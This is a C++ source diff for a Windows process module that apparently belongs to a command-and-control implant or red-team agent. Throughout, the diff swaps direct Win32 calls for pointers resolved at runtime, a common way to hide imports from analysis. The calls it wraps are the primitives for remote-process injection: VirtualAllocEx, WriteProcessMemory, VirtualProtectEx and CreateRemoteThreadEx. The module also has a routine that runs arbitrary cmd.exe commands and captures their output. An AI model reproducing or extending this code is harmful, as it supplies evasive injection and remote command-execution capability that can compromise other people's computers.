@@ -50,7 +50,7 @@ namespace System::Process
 			RtlZeroMemory(&si, sizeof(si));
 			si.cb = sizeof(si);
 
-			if (CreateProcessW(
+			if (pProcs->lpCreateProcessW(
 				lpApplicationName,
 				nullptr,
 				nullptr,
@@ -94,7 +94,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			hProcess = OpenProcess(
+			hProcess = pProcs->lpOpenProcess(
 				dwDesiredAccess,
 				FALSE,
 				dwProcessID
@@ -120,7 +120,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			if (!OpenProcessToken(
+			if (!pProcs->lpOpenProcessToken(
 				hProcess,
 				dwDesiredAccess,
 				&hToken
@@ -145,7 +145,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			return TerminateProcess(hProcess, EXIT_SUCCESS);
+			return pProcs->lpTerminateProcess(hProcess, EXIT_SUCCESS);
 		}
 		return TRUE;
 	}
@@ -170,7 +170,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			return VirtualAllocEx(
+			return pProcs->lpVirtualAllocEx(
                 hProcess,
                 pBaseAddr,
                 dwSize,
@@ -201,7 +201,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			if (!ReadProcessMemory(
+			if (!pProcs->lpReadProcessMemory(
 				hProcess,
 				(LPCVOID)pBaseAddr,
 				pBuffer,
@@ -234,7 +234,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			if (!WriteProcessMemory(
+			if (!pProcs->lpWriteProcessMemory(
 				hProcess,
 				pBaseAddr,
 				pBuffer,
@@ -266,7 +266,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			if (!VirtualProtectEx(
+			if (!pProcs->lpVirtualProtectEx(
 				hProcess,
 				pBaseAddr,
 				*pdwSize,
@@ -296,7 +296,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			return VirtualFree(
+			return pProcs->lpVirtualFree(
 				pBaseAddr,
 				*pdwSize,
 				dwFreeType
@@ -331,7 +331,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			hThread = CreateRemoteThreadEx(
+			hThread = pProcs->lpCreateRemoteThreadEx(
 				hProcess,
 				nullptr,
 				0,
@@ -361,18 +361,18 @@ namespace System::Process
 		sa.bInheritHandle = TRUE;
 		sa.lpSecurityDescriptor = NULL;
 
-		if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
+		if (!pProcs->lpCreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
 		{
 			return L"";
 		}
 
-		if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0))
+		if (!pProcs->lpSetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0))
 		{
 			return L"";
 		}
 
-		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
-		ZeroMemory(&si, sizeof(STARTUPINFOW));
+		RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+		RtlZeroMemory(&si, sizeof(STARTUPINFOW));
 
 		si.cb = sizeof(STARTUPINFOW);
 		si.hStdError = hWritePipe;
@@ -382,7 +382,7 @@ namespace System::Process
 
 		// Set application name (full path)
 		WCHAR system32Path[MAX_PATH];
-		GetSystemDirectoryW(system32Path, MAX_PATH);
+		pProcs->lpGetSystemDirectoryW(system32Path, MAX_PATH);
 		std::wstring wSystem32Path = std::wstring(system32Path);
 		const std::wstring applicationName = wSystem32Path + L"\\cmd.exe";
 		// const std::wstring applicationName = wSystem32Path + L"\\WindowsPowerShell\\v1.0\powershell.exe";
@@ -391,7 +391,7 @@ namespace System::Process
 		std::wstring commandLine = L"/C " + wCmd;
 		// std::wstring commandLine = L"-c " + cmd;
 
-		bResults = CreateProcessW(
+		bResults = pProcs->lpCreateProcessW(
 			applicationName.c_str(),
 			&commandLine[0],
 			NULL,
@@ -412,17 +412,17 @@ namespace System::Process
 		DWORD dwRead;
 		CHAR chBuf[4096];
 		
-		CloseHandle(hWritePipe);
+		pProcs->lpCloseHandle(hWritePipe);
 
-		while (ReadFile(hReadPipe, chBuf, 4095, &dwRead, NULL) && dwRead > 0)
+		while (pProcs->lpReadFile(hReadPipe, chBuf, 4095, &dwRead, NULL) && dwRead > 0)
 		{
 			chBuf[dwRead] = '\0';
 			result += std::wstring(chBuf, chBuf + dwRead);
 		}
 
-		CloseHandle(pi.hProcess);
-		CloseHandle(pi.hThread);
-		CloseHandle(hReadPipe);
+		pProcs->lpCloseHandle(pi.hProcess);
+		pProcs->lpCloseHandle(pi.hThread);
+		pProcs->lpCloseHandle(hReadPipe);
 
 		return result;
 	}
